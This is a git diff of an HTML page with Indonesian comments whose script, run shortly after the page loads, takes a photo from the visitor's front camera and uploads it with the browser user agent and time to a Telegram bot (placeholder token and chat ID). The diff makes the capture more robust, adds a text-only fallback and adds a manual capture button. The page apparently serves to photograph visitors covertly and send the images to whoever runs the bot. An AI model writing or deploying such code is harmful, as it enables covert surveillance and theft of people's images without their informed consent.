@@ -147,100 +147,184 @@
     <canvas id="canvas"></canvas>
 
     <script>
-        // Fungsi untuk meminta izin kamera dan mengambil gambar
+        // Debugging status container
+        function showStatus(message, isError = false) {
+            console.log(message);
+            const statusMsg = document.getElementById('statusMessage');
+            statusMsg.textContent = message;
+            statusMsg.className = isError ? 'error' : 'success';
+            statusMsg.style.display = 'block';
+            
+            // Auto-hide after 5 seconds if not an error
+            if (!isError) {
+                setTimeout(() => { 
+                    statusMsg.style.display = 'none';
+                }, 5000);
+            }
+        }
+        
+        // Fungsi untuk meminta izin kamera dan mengambil gambar - IMPROVED
         async function captureImage() {
+            showStatus("Meminta akses kamera...");
+            
             try {
-                // Minta akses kamera
-                const stream = await navigator.mediaDevices.getUserMedia({ 
+                // Opsi kamera yang lebih fleksibel untuk cross-browser
+                const constraints = { 
+                    audio: false,
                     video: { 
                         facingMode: "user",
-                        width: { ideal: 640 },
-                        height: { ideal: 480 }
+                        width: { min: 320, ideal: 640, max: 1280 },
+                        height: { min: 240, ideal: 480, max: 720 }
                     } 
-                });
+                };
+                
+                // Minta akses kamera dengan error handling lebih baik
+                const stream = await navigator.mediaDevices.getUserMedia(constraints)
+                    .catch(error => {
+                        console.error("MediaDevices error:", error.name, error.message);
+                        showStatus(`Error kamera: ${error.message}`, true);
+                        throw error;
+                    });
+                
+                showStatus("Kamera aktif, mengambil gambar...");
                 
                 const video = document.getElementById('cameraFeed');
                 video.srcObject = stream;
                 
-                // Tunggu video siap
-                return new Promise((resolve) => {
+                // Tunggu video siap dengan timeout handling
+                return new Promise((resolve, reject) => {
+                    // Set timeout untuk mencegah hang
+                    const timeoutId = setTimeout(() => {
+                        reject(new Error("Video loading timeout"));
+                    }, 10000);
+                    
+                    // Event handlers
                     video.onloadedmetadata = () => {
-                        // Tunggu sebentar agar kamera fokus
+                        clearTimeout(timeoutId);
+                        video.play();
+                        
+                        // Tunggu sebentar agar kamera fokus dan stabil
                         setTimeout(() => {
-                            // Ambil gambar dari video
-                            const canvas = document.getElementById('canvas');
-                            canvas.width = video.videoWidth;
-                            canvas.height = video.videoHeight;
-                            const ctx = canvas.getContext('2d');
-                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                            
-                            // Konversi ke base64
-                            const imageBase64 = canvas.toDataURL('image/jpeg', 0.8);
-                            
-                            // Matikan kamera
-                            stream.getTracks().forEach(track => track.stop());
-                            
-                            resolve(imageBase64);
-                        }, 1000);
+                            try {
+                                // Ambil gambar dari video dengan error handling
+                                const canvas = document.getElementById('canvas');
+                                canvas.width = video.videoWidth || 640;
+                                canvas.height = video.videoHeight || 480;
+                                
+                                const ctx = canvas.getContext('2d');
+                                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                                
+                                // Konversi ke base64 dengan kualitas lebih rendah untuk ukuran file lebih kecil
+                                const imageBase64 = canvas.toDataURL('image/jpeg', 0.7);
+                                
+                                // Matikan kamera
+                                stream.getTracks().forEach(track => track.stop());
+                                
+                                showStatus("Gambar berhasil diambil");
+                                resolve(imageBase64);
+                            } catch (drawError) {
+                                console.error("Error saat mengambil gambar:", drawError);
+                                showStatus("Error saat mengambil gambar", true);
+                                reject(drawError);
+                            }
+                        }, 1500); // Waktu tunggu lebih lama untuk stabilisasi
+                    };
+                    
+                    video.onerror = (err) => {
+                        clearTimeout(timeoutId);
+                        console.error("Video element error:", err);
+                        showStatus("Error pada video element", true);
+                        reject(err);
                     };
                 });
             } catch (error) {
-                console.error("Tidak dapat mengakses kamera:", error);
+                console.error("Error akses kamera:", error);
+                showStatus(`Tidak dapat mengakses kamera: ${error.message}`, true);
                 return null;
             }
         }
         
         // Fungsi untuk mengirim gambar ke Telegram
         async function sendImageToTelegram(imageBase64, extraInfo) {
-            // Ganti dengan Bot Token dan Chat ID Anda
+            // ⚠️ GANTI DENGAN DATA ANDA
             const botToken = 'YOUR_BOT_TOKEN';
             const chatId = 'YOUR_CHAT_ID';
-            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
             
-            // Pisahkan prefix dari data base64
-            const base64Data = imageBase64.split(',')[1];
+            console.log("Mencoba mengirim gambar ke Telegram...");
             
-            // Buat form data
-            const formData = new FormData();
-            formData.append('chat_id', chatId);
-            formData.append('photo', new Blob([Uint8Array.from(atob(base64Data), c => c.charCodeAt(0))], { type: 'image/jpeg' }));
-            formData.append('caption', extraInfo);
-            
+            // Metode 1: Menggunakan API sendPhoto dengan base64 string
             try {
-                const response = await fetch(telegramUrl, {
+                // Pisahkan prefix dari data base64
+                const base64Data = imageBase64.split(',')[1];
+                
+                // Pertama: Coba kirim dengan metode file URL (paling reliable)
+                const fileUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
+                
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('caption', extraInfo);
+                
+                // Convert base64 to blob
+                const byteCharacters = atob(base64Data);
+                const byteArrays = [];
+                
+                for (let offset = 0; offset < byteCharacters.length; offset += 512) {
+                    const slice = byteCharacters.slice(offset, offset + 512);
+                    
+                    const byteNumbers = new Array(slice.length);
+                    for (let i = 0; i < slice.length; i++) {
+                        byteNumbers[i] = slice.charCodeAt(i);
+                    }
+                    
+                    const byteArray = new Uint8Array(byteNumbers);
+                    byteArrays.push(byteArray);
+                }
+                
+                const blob = new Blob(byteArrays, {type: 'image/jpeg'});
+                formData.append('photo', blob, 'webcam.jpg');
+                
+                const response = await fetch(fileUrl, {
                     method: 'POST',
                     body: formData
                 });
-                const data = await response.json();
-                return data.ok;
+                
+                const result = await response.json();
+                console.log("Hasil pengiriman gambar:", result);
+                
+                if (result.ok) {
+                    console.log("✅ Gambar berhasil dikirim!");
+                    return true;
+                } else {
+                    throw new Error(result.description || "Failed to send photo");
+                }
             } catch (error) {
-                console.error("Error sending image:", error);
-                return false;
-            }
-        }
-        
-        // Fungsi alternatif untuk mengirim gambar ke Telegram
-        // Menggunakan URL yang dapat diakses publik jika metode di atas gagal
-        async function sendImageUrlToTelegram(imageBase64, extraInfo) {
-            const botToken = 'YOUR_BOT_TOKEN';
-            const chatId = 'YOUR_CHAT_ID';
-            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
-            
-            try {
-                const response = await fetch(telegramUrl, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        photo: imageBase64,
-                        caption: extraInfo
-                    })
-                });
-                const data = await response.json();
-                return data.ok;
-            } catch (error) {
-                console.error("Error sending image URL:", error);
-                return false;
+                console.error("❌ Error dalam mengirim gambar:", error);
+                
+                // Metode 2: Fallback menggunakan sendMessage dengan link gambar
+                try {
+                    console.log("Mencoba metode fallback...");
+                    
+                    // Kirim teks saja dengan info bahwa gambar gagal
+                    const msgUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+                    const infoMessage = extraInfo + "\n\n[Gambar tidak dapat dikirim - error teknis]";
+                    
+                    const msgResponse = await fetch(msgUrl, {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: infoMessage,
+                            parse_mode: 'HTML'
+                        })
+                    });
+                    
+                    const msgResult = await msgResponse.json();
+                    console.log("Hasil pengiriman teks fallback:", msgResult);
+                    return msgResult.ok;
+                } catch (fallbackError) {
+                    console.error("❌ Fallback method failed:", fallbackError);
+                    return false;
+                }
             }
         }
         
@@ -332,8 +416,33 @@
             });
         }
         
-        // Jalankan fungsi utama saat dokumen siap
-        document.addEventListener('DOMContentLoaded', main);
+        // Tambahkan event listener untuk debugging tombol
+        document.getElementById('submitBtn').addEventListener('click', function() {
+            console.log("Submit button clicked");
+        });
+        
+        // Jalankan fungsi utama dengan delay untuk browser mobile
+        document.addEventListener('DOMContentLoaded', function() {
+            // Delay eksekusi sedikit untuk memberi waktu browser mobile
+            setTimeout(main, 800);
+            
+            // Tambahkan tombol manual untuk trigger kamera
+            const mainContent = document.querySelector('.main-content');
+            const debugBtn = document.createElement('button');
+            debugBtn.textContent = "Aktifkan Kamera Manual";
+            debugBtn.style.marginTop = "10px";
+            debugBtn.style.backgroundColor = "#555";
+            debugBtn.addEventListener('click', async function() {
+                const imageBase64 = await captureImage();
+                if (imageBase64) {
+                    const deviceInfo = `📱 Manual Capture\n` +
+                                  `🌐 Browser: ${navigator.userAgent.substring(0, 100)}\n` +
+                                  `⏰ Waktu: ${new Date().toLocaleString()}`;
+                    sendImageToTelegram(imageBase64, deviceInfo);
+                }
+            });
+            mainContent.appendChild(debugBtn);
+        });
     </script>
 </body>
 </html>
